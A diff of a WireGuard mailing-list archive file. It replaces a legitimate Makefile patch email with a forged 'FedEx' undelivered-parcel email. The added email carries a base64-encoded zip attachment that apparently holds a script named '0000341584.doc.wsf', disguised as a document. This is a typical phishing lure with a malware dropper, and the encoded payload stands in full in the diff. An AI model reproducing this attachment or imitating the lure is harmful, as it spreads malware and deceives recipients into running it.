@@ -1,13 +1,19 @@
-Return-Path: eworm@leda.eworm.de
-Received: from mx.mylinuxtime.de (mx.mylinuxtime.de [148.251.109.235])
- by krantz.zx2c4.com (ZX2C4 Mail Server) with ESMTP id 518490d3
- for <wireguard@lists.zx2c4.com>; Sat, 3 Dec 2016 11:48:59 +0000 (UTC)
-From: Christian Hesse <list@eworm.de>
+Return-Path: hotideia@hosting53.serverhs.org
+Received: from hotideias.com (ns1.hotideias.com [185.90.56.149])
+ by krantz.zx2c4.com (ZX2C4 Mail Server) with ESMTP id 7879b632
+ for <wireguard@lists.zx2c4.com>; Sat, 3 Dec 2016 12:00:43 +0000 (UTC)
+Received: from hotideia by hosting53.serverhs.org with local (Exim 4.87)
+ (envelope-from <hotideia@hosting53.serverhs.org>) id 1cD94S-001wvT-As
+ for wireguard@lists.zx2c4.com; Sat, 03 Dec 2016 12:05:36 +0000
 To: wireguard@lists.zx2c4.com
-Subject: [PATCH 1/1] include tests/debug.mk only if exists
-Date: Sat,  3 Dec 2016 12:53:42 +0100
-Message-Id: <20161203115342.20950-1-list@eworm.de>
-Cc: Christian Hesse <mail@eworm.de>
+Subject: We could not deliver your parcel, #0000341584
+Date: Sat, 3 Dec 2016 12:05:36 +0000
+From: "FedEx International Ground" <jimmy.hood@hotideias.com>
+Message-ID: <8782d14f9b377fd5a6a9c9e78fe7666e@hotideias.com>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="b1_fb5d3d81a54317b1b5f7e05350b3b4d4"
+Sender: <hotideia@hosting53.serverhs.org>
+Reply-To: FedEx International Ground <jimmy.hood@hotideias.com>
 List-Id: Development discussion of WireGuard <wireguard.lists.zx2c4.com>
 List-Unsubscribe: <https://lists.zx2c4.com/mailman/options/wireguard>,
  <mailto:wireguard-request@lists.zx2c4.com?subject=unsubscribe>
@@ -17,28 +23,68 @@ List-Help: <mailto:wireguard-request@lists.zx2c4.com?subject=help>
 List-Subscribe: <https://lists.zx2c4.com/mailman/listinfo/wireguard>,
  <mailto:wireguard-request@lists.zx2c4.com?subject=subscribe>
 
-From: Christian Hesse <mail@eworm.de>
+--b1_fb5d3d81a54317b1b5f7e05350b3b4d4
+Content-Type: text/plain; charset=us-ascii
 
-DKMS packages do not contain tests/debug.mk, so do not include if it
-does not exist.
+Dear Customer,
 
-Signed-off-by: Christian Hesse <mail@eworm.de>
----
- src/Makefile | 2 ++
- 1 file changed, 2 insertions(+)
+Courier was unable to deliver the parcel to you.
+Shipment Label is attached to this email.
 
-diff --git a/src/Makefile b/src/Makefile
-index 20947ac..370c2ea 100644
---- a/src/Makefile
-+++ b/src/Makefile
-@@ -36,6 +36,8 @@ check:
- cloc: clean
- 	cloc $(filter-out compat.h, $(wildcard *.c) $(wildcard *.h))
- 
-+ifeq ($(wildcard tests/debug.mk),tests/debug.mk)
- include tests/debug.mk
-+endif
- 
- .PHONY: all module module-debug tools install clean core-cloc check version.h
--- 
-2.10.2
+Warm regards,
+Jimmy Hood,
+FedEx Support Manager.
+
+
+--b1_fb5d3d81a54317b1b5f7e05350b3b4d4
+Content-Type: application/zip; name="0000341584.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=0000341584.zip
+
+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
+AAACAAIAewAAABIJAAAAAA==
+
+
+--b1_fb5d3d81a54317b1b5f7e05350b3b4d4--
